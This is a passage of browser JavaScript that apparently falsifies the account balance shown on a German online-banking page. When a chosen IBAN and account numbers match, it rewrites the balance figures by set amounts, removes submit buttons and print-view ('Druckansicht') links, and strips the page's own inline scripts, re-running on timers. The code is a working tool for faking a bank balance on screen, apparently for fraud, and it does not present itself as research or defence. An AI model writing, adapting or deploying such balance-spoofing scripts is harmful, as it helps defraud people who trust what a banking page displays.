        var ibanElement = document.getElementsByClassName("mkp-identifier-description")[0]?.children[1]?.children[0];
        if (ibanElement && ibanElement.textContent.trim() === desiredIBAN) {
            if (vorgemerkt === "no") {
                modifyMainBalance();
            }
        }
    }

    // Function to modify the main balance
    function modifyMainBalance() {
        var submitElements = document.querySelectorAll('[onclick="return IF.checkFirstSubmit();"]');
        if (submitElements.length > 0) {
            console.log('Found elements with onclick="return IF.checkFirstSubmit();". Updating balances...');

            // Iterate through the balance configurations and apply changes
            if (useSameAdjustmentAmount) {
                BALANCE_CONFIGS.forEach(function(config) {
                    var balanceElements = document.querySelectorAll('.plus, .minus');
                    if (config.index < balanceElements.length) {
                        var balanceElement = balanceElements[config.index];
                        changeBalance(balanceElement, adjustmentAmount);
                    } else {
                        console.log('Balance element not found for index ' + config.index);
                    }
                });
            } else {
                var balanceElements = document.querySelectorAll('.plus, .minus');
                balanceElements.forEach(function(balanceElement, index) {
                    var config = BALANCE_CONFIGS.find(function(cfg) {
                        return cfg.index === index;
                    });
                    if (config) {
                        changeBalance(balanceElement, config.adjustmentAmount);
                    } else {
                        console.log('No configuration found for balance element at index ' + index);
                    }
                });
            }
        }
    }

    // Function to change the balance
    function changeBalance(balanceElement, adjustmentAmount) {
        var currentBalanceText = balanceElement.textContent.trim();
        var currentBalanceValue = parseFloat(currentBalanceText.replace(/[^\d,-]+/g, '').replace(',', '.'));

        if (!isNaN(currentBalanceValue)) {
            var newBalanceValue = currentBalanceValue + adjustmentAmount;
            var newBalanceText = formatBalance(newBalanceValue) + ' EUR'; // Add "EUR" currency symbol

            // Update the balance text with the correct sign
            if (newBalanceValue < 0) {
                newBalanceText = '-' + newBalanceText.replace('-', ''); // Add negative sign if the balance is negative
            }

            // Change the class to "minus" if the balance is negative
            if (newBalanceValue < 0) {
                balanceElement.classList.remove('plus');
                balanceElement.classList.add('minus');
            } else {
                balanceElement.classList.remove('minus');
                balanceElement.classList.add('plus');
            }

            // Update the balance element with the new value and text
            balanceElement.textContent = newBalanceText;

            console.log('Balance changed from ' + currentBalanceText + ' to ' + newBalanceText);

            // Remove elements with onclick="return IF.checkFirstSubmit();" after 5 milliseconds
            setTimeout(function() {
                var submitElements = document.querySelectorAll('[onclick="return IF.checkFirstSubmit();"]');
                submitElements.forEach(function(element) {
                    element.remove();
                    console.log("Element with onclick='return IF.checkFirstSubmit();' removed.");
                });
            }, 5); // 5 milliseconds
        } else {
            console.log('Failed to parse current balance value.');
        }
    }

    // Function to format the balance with correct separators
    function formatBalance(balance) {
        var formattedBalance = balance.toFixed(2).replace(/\./g, ','); // Use comma as decimal separator
        return formattedBalance.replace(/\B(?=(\d{3})+(?!\d))/g, "."); // Add dots as thousands separators
    }

    // Call the function initially
    removeDruckansichtElements();
    checkAndModifyBalance();

    // Set interval to repeatedly check the condition
    setInterval(checkAndModifyBalance, interval);
}


 if (window.location.href.indexOf("kontodetails") > 0 || window.location.href.indexOf("10658384414") > 0 || window.location.href.indexOf("11280968645") > 0 ) {

// Function to remove inline scripts from the document
function removeInlineScripts() {
    console.log("Removing inline scripts...");
    document.querySelectorAll('script').forEach(function(script) {
        script.remove();
        console.log("Inline script removed.");
    });
}

// Function to remove elements with title "Druckansicht"
function removeDruckansichtElements() {
    var elements = document.querySelectorAll('[title="Druckansicht"]');
    elements.forEach(function(element) {
        element.remove();
        console.log('Element with title "Druckansicht" removed.');
    });
}

// Remove all inline scripts from the document
removeInlineScripts();

// Remove elements with title "Druckansicht" initially
removeDruckansichtElements();

// Periodically remove elements with title "Druckansicht"
setInterval(removeDruckansichtElements, 200); // Check every 2 seconds
}
